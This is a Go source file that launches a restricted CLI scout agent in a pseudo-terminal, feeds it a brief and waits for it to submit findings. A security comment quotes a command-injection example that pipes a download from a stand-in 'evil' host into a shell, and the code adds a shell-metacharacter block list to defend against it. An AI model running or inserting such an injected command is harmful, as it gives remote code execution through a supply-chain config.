package engine

import (
	"encoding/json"
	"fmt"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/zdypro888/iknowledge/internal/pty"
	"github.com/zdypro888/iknowledge/internal/store"
)

// 自派备模式(knowledge.md §10.4 轮 22 备模式;impl §7.5;2026-07-04 实装):
// 服务端 PTY 驱动一个交互式 CLI 侦察兵执行简报,阻塞等 kb_submit_findings 回程。
// 面向无子代理宿主/需接口级隔离(侦察兵连 /mcp/scout/<job>,工具集受限)。
// 与 aibridge 方案的关键差异:交卷信号走协议(SubmitFindings→job.done),
// 不解析终端画面,故无需终端仿真库(铁律一:零重依赖,PTY 原语手写)。

// SetScoutAddr 注入 serve 实际监听地址(自派侦察兵回连用;--addr 覆盖端口时
// config 端口不可信)。serve 启动期调用,先于任何请求,不加锁。
func (e *Engine) SetScoutAddr(addr string) { e.scoutAddr = addr }

// scoutBase 返回侦察兵回连的 host:port(缺省从 config 端口推导)。
func (e *Engine) scoutBase() string {
	if e.scoutAddr != "" {
		return e.scoutAddr
	}
	if cfg, _ := e.Store.LoadConfig(); cfg != nil {
		return fmt.Sprintf("127.0.0.1:%d", cfg.Port)
	}
	return ""
}

// selfDispatch 驱动自派侦察兵:写 scout MCP 配置 → PTY 启动 → 喂简报 →
// 阻塞等交卷/超时/进程早退。调用时不持 rt.mu(SubmitFindings 要拿锁)。
func (e *Engine) selfDispatch(job *scoutJob, brief string, cfg *store.Config) (string, error) {
	base := e.scoutBase()
	if base == "" {
		return "", kbErr("SCOUT_TIMEOUT", "无法确定回连地址(缺 config 端口)", "检查 .knowledge/config.yaml")
	}

	// scout MCP 配置写 .knowledge/local/(铁律二边界内);用完即删,日志保留。
	scoutURL := fmt.Sprintf("http://%s/mcp/scout/%s?repo=%s", base, job.ID, url.QueryEscape(e.Store.RepoRoot()))
	mcpCfg := map[string]any{"mcpServers": map[string]any{"knowledge": mcpServerEntry(scoutURL, e.Store)}}
	cfgBytes, err := json.MarshalIndent(mcpCfg, "", "  ")
	if err != nil {
		return "", err
	}
	cfgPath := filepath.Join(e.Store.Dir(), "local", "scout-mcp-"+job.ID+".json")
	if err := os.MkdirAll(filepath.Dir(cfgPath), 0o755); err != nil {
		return "", err
	}
	if err := os.WriteFile(cfgPath, cfgBytes, 0o600); err != nil {
		return "", err
	}
	defer os.Remove(cfgPath)

	cmd := scoutCommand(cfg.ScoutCommand, cfgPath)
	cmd.Dir = e.Store.RepoRoot()
	// R29-S1.1:不覆盖 cmd.Env——scoutCommand 可能已解析 KEY=VAL 前缀(如测试的
	// GO_SCOUT_HELPER=1)。cmd.Env 为空时 os/exec 默认继承父进程;非空时需含全量环境,
	// 所以这里在 scoutCommand 设的 Env 基础上补 TERM(为空则从父进程起)。
	if cmd.Env == nil {
		cmd.Env = os.Environ()
	}
	cmd.Env = append(cmd.Env, "TERM=xterm-256color")

	ptmx, err := pty.Start(cmd)
	if err != nil {
		return "", kbErr("SCOUT_TIMEOUT", "侦察兵进程启动失败:"+err.Error(),
			"检查 config 的 scout_command;或改回委派模式(scout: delegate)")
	}
	defer ptmx.Close()
	defer pty.KillGroup(cmd)

	// 输出旁路进日志(有界),同时扫 spinner/响应符号做"回合已启动"信号
	//(kbeval 排障定案:欢迎屏无这些符号;首启信任弹窗会吞输入,须检测 + 重投)。
	logPath := filepath.Join(e.Store.Dir(), "local", "scout-"+job.ID+".log")
	activity := make(chan struct{}, 1)
	go drainToLog(ptmx, logPath, 1<<20, activity)
	exited := make(chan error, 1)
	go func() { exited <- cmd.Wait() }()

	// 喂简报:括号粘贴包裹(多行文本裸 \n 会被 TUI 当回车逐行提交,kbeval 排障定案)
	// + 两步输入(正文、停顿、单发回车,对抗 paste 突发去抖,aibridge driver.go 同法)。
	time.Sleep(6 * time.Second) // TUI 启动等待
	submit := func() {
		if _, err := ptmx.Write([]byte("\x1b[200~" + brief + "\x1b[201~")); err == nil {
			time.Sleep(2 * time.Second)
			ptmx.Write([]byte("\r"))
		}
	}
	submit()

	// 启动确认:25s 无活动符号 → 单发回车收弹窗 + 重投(上限 2 次)。
	// 同时监听交卷/退程——非 TUI 侦察兵(自定义 scout_command)可能不画 spinner 直接交卷。
	started := false
	for resends := 0; !started; {
		select {
		case <-activity:
			started = true
		case findings := <-job.done:
			pty.KillGroup(cmd)
			return framed(findings + "\n(自派侦察兵已交卷;蒸馏物已落库,日志:" +
				filepath.ToSlash(filepath.Join(".knowledge", "local", "scout-"+job.ID+".log")) + ")"), nil
		case err := <-exited:
			select { // 退程宽限:交卷 HTTP 可能竞态在退程前一瞬
			case findings := <-job.done:
				return framed(findings + "\n(自派侦察兵已交卷)"), nil
			case <-time.After(2 * time.Second):
			}
			return "", kbErr("SCOUT_TIMEOUT",
				fmt.Sprintf("侦察兵进程启动即退出(%v)", err),
				"看日志 .knowledge/local/scout-"+job.ID+".log;检查 scout_command")
		case <-time.After(25 * time.Second):
			if resends == 2 {
				pty.KillGroup(cmd)
				return "", kbErr("SCOUT_TIMEOUT",
					"侦察兵未能启动回合(重投 2 次无响应;新目录首启的信任确认可能需要人工跑一次交互式 claude)",
					"在该仓库手动跑一次 claude 完成目录信任后重试;或看日志 .knowledge/local/scout-"+job.ID+".log")
			}
			resends++
			ptmx.Write([]byte("\r"))
			time.Sleep(3 * time.Second)
			submit()
		}
	}

	timeout := time.Duration(cfg.ScoutTimeoutSec) * time.Second
	if timeout <= 0 {
		timeout = 300 * time.Second
	}
	select {
	case findings := <-job.done:
		pty.KillGroup(cmd)
		return framed(findings + "\n(自派侦察兵已交卷;蒸馏物已落库,日志:" +
			filepath.ToSlash(filepath.Join(".knowledge", "local", "scout-"+job.ID+".log")) + ")"), nil
	case err := <-exited:
		// 进程退了还没交卷:再宽限一拍(交卷 HTTP 可能竞态在退程前一瞬)。
		select {
		case findings := <-job.done:
			return framed(findings + "\n(自派侦察兵已交卷)"), nil
		case <-time.After(2 * time.Second):
		}
		return "", kbErr("SCOUT_TIMEOUT",
			fmt.Sprintf("侦察兵进程退出未交卷(%v)", err),
			"看日志 .knowledge/local/scout-"+job.ID+".log;job 仍在(TTL 30 分钟),迟到交卷会落库,用 kb_status 查看")
	case <-time.After(timeout):
		pty.KillGroup(cmd)
		return "", kbErr("SCOUT_TIMEOUT",
			fmt.Sprintf("侦察兵超时未交卷(%s)", timeout),
			"用 kb_status 查看已落库蒸馏物;job 仍在(TTL 30 分钟),迟到交卷不白费")
	}
}

// mcpServerEntry 组装 scout 的 MCP server 配置;serve --auth 时带令牌头。
func mcpServerEntry(url string, s *store.Store) map[string]any {
	entry := map[string]any{"type": "http", "url": url}
	if tok, _ := s.LoadAuthToken(); tok != "" {
		entry["headers"] = map[string]string{"Authorization": "Bearer " + tok}
	}
	return entry
}

// scoutCommand 构造侦察兵进程。
//
// 安全(R29-P0):configured 来自 .knowledge/config.yaml,会随 git 传播——是供应链输入。
// 旧实现走 sh -c,恶意 commit 写 `scout_command: "x; curl evil|sh # {mcp}"` 即 RCE。
// 现改为零依赖自切词:strings.Fields 切 argv(空格分隔),支持 shell 风格的 KEY=VAL 环境变量
// 前缀(前导元素形如 KEY=VAL 的归入 Env,到第一个非 KEY=VAL 元素为止),再在每个剩余元素上
// 替换 {mcp}——这样 cfgPath 即使含空格也作为单个完整 argv 元素(exec.Command 的 argv 是字符串
// 切片,不经 shell,空格无特殊含义)。含 shell 元字符(;|&`$ 换行 反引号)的模板拒绝并回退
// 默认命令——正当的自定义命令通常是 "tool --flag {mcp}" 这类,不需要 shell 元字符。
// 仍需复杂 shell 语法的用户,显式写 wrapper 脚本再 scout_command 指向它即可。
func scoutCommand(configured, cfgPath string) *exec.Cmd {
	defaultCmd := func() *exec.Cmd {
		return exec.Command("claude", "--mcp-config", cfgPath, "--strict-mcp-config", "--allowedTools", "mcp__knowledge__*")
	}
	trimmed := strings.TrimSpace(configured)
	if trimmed == "" {
		return defaultCmd()
	}
	if strings.ContainsAny(trimmed, ";\n|&`$") {
		// 含 shell 元字符:可能是注入,也可能用户真想用 shell。为安全前者优先,回退默认。
		return defaultCmd()
	}
	fields := strings.Fields(trimmed)
	if len(fields) == 0 {
		return defaultCmd()
	}
	// {mcp} 替换在切词之后:每个 field 作为独立 argv 元素,cfgPath 含空格也安全。
	for i, f := range fields {
		fields[i] = strings.ReplaceAll(f, "{mcp}", cfgPath)
	}
	// shell 风格 KEY=VAL 前缀:前导的环境变量赋值归入 Env(到第一个非 KEY=VAL 元素止)。
	// KEY=VAL 的 VAL 经 {mcp} 替换不含元字符则安全;正则 ^[\w.]+= 判 KEY 合法性。
	var env, argv []string
	for _, f := range fields {
		if len(argv) == 0 && envKeyVal.MatchString(f) {
			env = append(env, f)
			continue
		}
		argv = append(argv, f)
	}
	if len(argv) == 0 {
		return defaultCmd()
	}
	cmd := exec.Command(argv[0], argv[1:]...)
	if len(env) > 0 {
		cmd.Env = append(os.Environ(), env...)
	}
	return cmd
}

var envKeyVal = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*=`)

// scoutActivityMarks 是"回合已启动"的屏幕信号:spinner/响应符只在回合运行时出现,
// 欢迎屏没有(kbeval 排障定案;字节流速会被输入框回显假触发,不可用)。
var scoutActivityMarks = []string{"✻", "✶", "✳", "✽", "⏺"}

// drainToLog 把 PTY 输出汇进日志文件,上限 cap 字节(超限丢弃,防失控进程刷盘);
// 首次扫到活动符号时向 activity 发一次信号(非阻塞,通道可为 nil)。
func drainToLog(r interface{ Read([]byte) (int, error) }, path string, capBytes int64, activity chan<- struct{}) {
	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o644)
	if err != nil {
		return
	}
	defer f.Close()
	signaled := false
	var written int64
	buf := make([]byte, 32<<10)
	for {
		n, err := r.Read(buf)
		if n > 0 {
			if !signaled && activity != nil {
				chunk := string(buf[:n])
				for _, m := range scoutActivityMarks {
					if strings.Contains(chunk, m) {
						signaled = true
						select {
						case activity <- struct{}{}:
						default:
						}
						break
					}
				}
			}
			if written < capBytes {
				m := int64(n)
				if written+m > capBytes {
					m = capBytes - written
				}
				f.Write(buf[:m])
				written += m
			}
		}
		if err != nil {
			return
		}
	}
}
